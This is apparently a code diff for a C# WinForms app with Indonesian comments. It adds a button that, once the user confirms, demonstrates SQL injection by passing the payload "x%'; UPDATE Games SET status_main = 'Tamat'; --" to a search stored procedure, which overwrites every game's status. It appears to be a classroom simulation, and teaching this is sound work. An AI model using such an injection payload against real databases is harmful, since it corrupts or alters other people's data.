@@ -277,5 +277,52 @@ namespace PetaniDesa
                 e.Handled = true;
             }
         }
+
+        private void btnSqlInjection_Click(object sender, EventArgs e)
+        {
+            // Tambahkan peringatan agar kamu tidak tidak sengaja mengkliknya
+            DialogResult dialog = MessageBox.Show(
+                "PERINGATAN: Ini akan mendemonstrasikan SQL Injection yang meretas database dan mengubah semua status game menjadi 'Tamat'. Lanjutkan eksekusi?",
+                "Simulasi Serangan SQL Injection",
+                MessageBoxButtons.YesNo,
+                MessageBoxIcon.Warning);
+
+            if (dialog == DialogResult.Yes)
+            {
+                try
+                {
+                    // NOTE: Ganti connection string di bawah dengan connection string SQL Server yang valid
+                    // Jika Anda menggunakan MySQL, gunakan MySqlConnection/MySqlCommand dan sesuaikan stored procedure/SQL.
+                    using (var conn = new SqlConnection("Data Source=SERVER;Initial Catalog=DATABASE;Integrated Security=True;"))
+                    using (var cmd = new SqlCommand("sp_SearchGame", conn))
+                    {
+                        conn.Open();
+
+                        // Ini adalah Payload SQL Injection-nya
+                        // Akan memotong query LIKE milik pencarian, menutupnya, lalu menyisipkan query UPDATE
+                        string payload = "x%'; UPDATE Games SET status_main = 'Tamat'; --";
+
+                        cmd.CommandType = CommandType.StoredProcedure;
+                        cmd.Parameters.AddWithValue("@keyword", payload);
+
+                        // Kita pakai ExecuteNonQuery karena payload berisi query UPDATE yang memanipulasi data
+                        cmd.ExecuteNonQuery();
+                    }
+
+                    MessageBox.Show(
+                        "💥 Serangan Berhasil! Semua status game telah diubah menjadi 'Tamat' secara paksa. Lihat perubahannya di tabel.",
+                        "System Hacked",
+                        MessageBoxButtons.OK,
+                        MessageBoxIcon.Exclamation);
+
+                    // Refresh tabel untuk melihat kerusakan yang terjadi
+                    btnRead.PerformClick();
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show("Gagal melakukan simulasi: " + ex.Message);
+                }
+            }
+        }
     }
-}
+    }
